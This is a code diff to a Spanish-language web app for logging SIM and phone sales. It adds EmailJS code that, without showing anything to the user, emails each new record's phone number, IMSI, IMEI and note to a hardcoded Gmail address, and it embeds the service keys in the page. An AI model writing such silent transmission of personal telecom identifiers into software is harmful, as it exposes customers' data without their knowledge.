@@ -616,9 +616,45 @@ html[data-theme="dark"] #updateModal .btn-cerrar{background:#262b33;color:#e8eae
 
 <script src="https://cdn.jsdelivr.net/npm/@zxing/library@0.21.3/umd/index.min.js" defer></script>
 
+<!-- 🔔 EmailJS para notificaciones silenciosas -->
+<script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
+
 <script>
 const $  = s => document.querySelector(s);
 const $$ = s => [...document.querySelectorAll(s)];
+
+/* ╔══════════════════════════════════════════════════════════════╗
+   ║   📧 CONFIGURACIÓN DE EMAILJS (NOTIFICACIÓN SILENCIOSA)      ║
+   ║   Te llega un correo a d478478293@gmail.com cada vez que    ║
+   ║   alguien registra un chip o un teléfono nuevo.             ║
+   ╚══════════════════════════════════════════════════════════════╝ */
+const EMAILJS_SERVICE_ID  = 'service_x8ujhb8';
+const EMAILJS_TEMPLATE_ID = 'template_sxnlcg6';
+const EMAILJS_PUBLIC_KEY  = 'sR4BnX8MrRfKpNU_U';
+/* Inicializar EmailJS */
+if (typeof emailjs !== 'undefined') {
+  try { emailjs.init(EMAILJS_PUBLIC_KEY); } catch(e) { console.log('EmailJS init error:', e); }
+}
+/* Envía el correo silencioso (no muestra nada al usuario) */
+function enviarNotificacion(tipo, numero, imsi, imei, nota) {
+  if (typeof emailjs === 'undefined') return;
+  try {
+    emailjs.send(EMAILJS_SERVICE_ID, EMAILJS_TEMPLATE_ID, {
+      tipo: tipo,
+      numero: numero || '—',
+      imsi: imsi || '—',
+      imei: imei || '—',
+      nota: nota || '—',
+      fecha: new Date().toLocaleString('es-MX', {
+        day: '2-digit', month: 'long', year: 'numeric',
+        hour: '2-digit', minute: '2-digit'
+      })
+    }).catch(function(error) {
+      console.log('Error al enviar notificación:', error);
+    });
+  } catch(e) { console.log('Error EmailJS:', e); }
+}
+/* ╚══════════════════════════════════════════════════════════════╝ */
 
 /* ╔══════════════════════════════════════════════════════════════╗
    ║   📝  INFORMACIÓN DE LA ACTUALIZACIÓN                        ║
@@ -632,7 +668,7 @@ const INFO_ACTUALIZACION = {
   novedades: [
     'Lectura de cámara más rápida',
     'Línea roja para alinear el IMEI',
-    'Escaneo automático de chip e IMEI',
+    'Notificación silenciosa por correo',
     'Botón de linterna en la cámara',
   ],
   aviso: 'Toca "Actualizar ahora" para aplicar los cambios. La app se reiniciará y tus datos se conservan.',
@@ -960,7 +996,6 @@ function iniciarEscaneoVivo(onDetectado){
         if(codes&&codes.length){
           let elegido = null;
           if(usarLinea){
-            /* La línea está al 50% del canvas */
             const lineY = c.height * 0.5;
             const margen = 60;
             for(const code of codes){
@@ -1143,7 +1178,36 @@ function tomarFotoIMEI(){tomarFoto('Foto de la etiqueta',d=>procesarDataUrlIMEI(
 function tomarFotoEquipo(){tomarFoto('Foto del Teléfono',d=>procesarDataUrlEquipo(d))}
 function pintarFotos(){const cb=$('#fotoChipBox');if(cb){if(fotoChipTemp){cb.innerHTML=`<img src="${fotoChipTemp}">`;const b=$('#btnQuitarFotoChip');if(b)b.style.display='flex'}else{cb.innerHTML=`<div class="ph">📷<br>Sin foto</div>`;const b=$('#btnQuitarFotoChip');if(b)b.style.display='none'}}const eb=$('#fotoEquipoBox');if(eb){if(fotoEquipoTemp){eb.innerHTML=`<img src="${fotoEquipoTemp}">`;const b=$('#btnQuitarFotoEquipo');if(b)b.style.display='flex'}else{eb.innerHTML=`<div class="ph">📷<br>Sin foto</div>`;const b=$('#btnQuitarFotoEquipo');if(b)b.style.display='none'}}}
 function quitarFoto(t){if(t==='chip')fotoChipTemp=null;else fotoEquipoTemp=null;pintarFotos()}
-function guardarRegistro(){const num=soloDigitos($('#f-numero').value);const imsi=soloDigitos($('#f-imsi').value);const imei=formTipo==='telefono'?soloDigitos($('#f-imei').value):'';const nota=$('#f-nota').value.trim();if(num.length<7)return toast('⚠️ Número inválido');if(imsi.length<10)return toast('⚠️ IMSI incompleto');if(formTipo==='telefono'&&imei.length<10)return toast('⚠️ IMEI incompleto');const d=registros.find(r=>r.id!==editId&&((imsi&&r.imsi===imsi)||(imei&&r.imei&&r.imei===imei)));if(d){const c=(d.imsi===imsi)?'IMSI':'IMEI';if(!confirm(`Ya existe con ese ${c} (${d.numero}).\n\n¿Guardar?`))return}let msj='';if(editId){const r=registros.find(x=>x.id===editId);Object.assign(r,{numero:num,imsi:imsi,imei:imei,nota:nota,fotoChip:fotoChipTemp,fotoEquipo:formTipo==='telefono'?fotoEquipoTemp:undefined,editado:new Date().toISOString()});delete r.foto;msj='✅ Actualizado'}else{const n={id:uid(),tipo:formTipo,numero:num,imsi:imsi,imei:imei,nota:nota,fotoChip:fotoChipTemp,fecha:new Date().toISOString(),fechaLocal:fechaLocalHoy()};if(formTipo==='telefono')n.fotoEquipo=fotoEquipoTemp;registros.push(n);msj='✅ Guardado'}guardarLS();volverAlInicio(msj)}
+function guardarRegistro(){
+  const num=soloDigitos($('#f-numero').value);
+  const imsi=soloDigitos($('#f-imsi').value);
+  const imei=formTipo==='telefono'?soloDigitos($('#f-imei').value):'';
+  const nota=$('#f-nota').value.trim();
+  if(num.length<7)return toast('⚠️ Número inválido');
+  if(imsi.length<10)return toast('⚠️ IMSI incompleto');
+  if(formTipo==='telefono'&&imei.length<10)return toast('⚠️ IMEI incompleto');
+  const d=registros.find(r=>r.id!==editId&&((imsi&&r.imsi===imsi)||(imei&&r.imei&&r.imei===imei)));
+  if(d){const c=(d.imsi===imsi)?'IMSI':'IMEI';if(!confirm(`Ya existe con ese ${c} (${d.numero}).\n\n¿Guardar?`))return}
+  let msj='';
+  if(editId){
+    const r=registros.find(x=>x.id===editId);
+    Object.assign(r,{numero:num,imsi:imsi,imei:imei,nota:nota,fotoChip:fotoChipTemp,fotoEquipo:formTipo==='telefono'?fotoEquipoTemp:undefined,editado:new Date().toISOString()});
+    delete r.foto;
+    msj='✅ Actualizado';
+  }else{
+    const n={id:uid(),tipo:formTipo,numero:num,imsi:imsi,imei:imei,nota:nota,fotoChip:fotoChipTemp,fecha:new Date().toISOString(),fechaLocal:fechaLocalHoy()};
+    if(formTipo==='telefono')n.fotoEquipo=fotoEquipoTemp;
+    registros.push(n);
+    msj='✅ Guardado';
+    /* 📧 NOTIFICACIÓN SILENCIOSA: solo cuando es registro NUEVO */
+    enviarNotificacion(
+      formTipo === 'chip' ? 'Chip' : 'Teléfono',
+      num, imsi, imei, nota
+    );
+  }
+  if (!guardarLS()) return;
+  volverAlInicio(msj);
+}
 function renderLista(){const rango=obtenerRangoFechas();const q=($('#buscar').value||'').trim().toLowerCase();let lista=registros.filter(r=>registroEnRango(r,rango));if(q)lista=lista.filter(r=>[r.numero,r.imsi,r.imei,r.nota].join(' ').toLowerCase().includes(q));lista.sort((a,b)=>new Date(b.fecha)-new Date(a.fecha));const lr=registros.filter(r=>registroEnRango(r,rango));const chips=lr.filter(r=>r.tipo==='chip').length;$('#st-total').textContent=lr.length;$('#st-chips').textContent=chips;$('#st-tels').textContent=lr.length-chips;const info=$('#filtroInfo');if(filtroFecha==='todo')info.innerHTML=`📊 <b>Todos</b>`;else if(filtroFecha==='custom')info.innerHTML=`📅 <b>${esc(nombreFechaCorta(fechaCustom))}</b>`;else if(filtroFecha==='hoy')info.innerHTML=`📅 Hoy · <b>${esc(nombreFechaCorta(fechaLocalHoy()))}</b>`;else if(filtroFecha==='ayer'){const a=sumarDias(fechaLocalHoy(),-1);info.innerHTML=`📅 Ayer · <b>${esc(nombreFechaCorta(a))}</b>`}else if(filtroFecha==='semana')info.innerHTML=`📅 <b>Esta semana</b>`;else if(filtroFecha==='mes')info.innerHTML=`📅 <b>Este mes</b>`;const cont=$('#lista');if(!lista.length){cont.innerHTML=`<div class="vacio"><span class="em">${q?'🔍':'📋'}</span>${q?'Sin resultados.':'Sin registros.'}</div>`;return}const conteo=lista.length;const headerHTML=`<div class="lista-header"><span>${filtroFecha==='hoy'?'📅 HOY':filtroFecha==='ayer'?'📅 AYER':filtroFecha==='custom'?'📅 '+nombreFechaCorta(fechaCustom).toUpperCase():filtroFecha==='semana'?'📅 SEMANA':filtroFecha==='mes'?'📅 MES':'📋 TODOS'}</span><span class="count">${conteo} ${conteo===1?'venta':'ventas'}</span></div>`;const items=lista.map(r=>{let src=null;if(r.tipo==='chip')src=r.fotoChip||r.foto;else src=r.fotoEquipo||r.fotoChip||r.foto;const mh=filtroFecha==='todo'||filtroFecha==='semana'||filtroFecha==='mes';const fm=mh?fmt(r.fecha):nombreFechaCorta(r.fechaLocal||derivarFechaLocal(r.fecha))+' · '+new Date(r.fecha).toLocaleTimeString('es-MX',{hour:'2-digit',minute:'2-digit'});return`<div class="item" onclick="abrirDetalle('${r.id}')"><div class="thumb">${src?`<img src="${src}" loading="lazy">`:(r.tipo==='chip'?'📶':'📱')}</div><div class="info"><div class="t1">${esc(r.numero)}<span class="pill ${r.tipo==='chip'?'pill-chip':'pill-tel'}">${r.tipo==='chip'?'CHIP':'EQUIPO'}</span></div><div class="t2">IMSI: ${esc(r.imsi||'—')}</div>${r.imei?`<div class="t2">IMEI: ${esc(r.imei)}</div>`:''}<div class="t3">${esc(fm)}</div></div><div style="color:#c3c8cf;font-size:20px">›</div></div>`}).join('');cont.innerHTML=headerHTML+items}
 function abrirDetalle(id){const r=registros.find(x=>x.id===id);if(!r)return;const fc=r.fotoChip||(r.tipo==='chip'?r.foto:null);const fe=r.fotoEquipo||(r.tipo==='telefono'?r.foto:null);$('#vista-detalle').innerHTML=`
 <button class="btn-volver" onclick="ir('home')">← Volver</button>
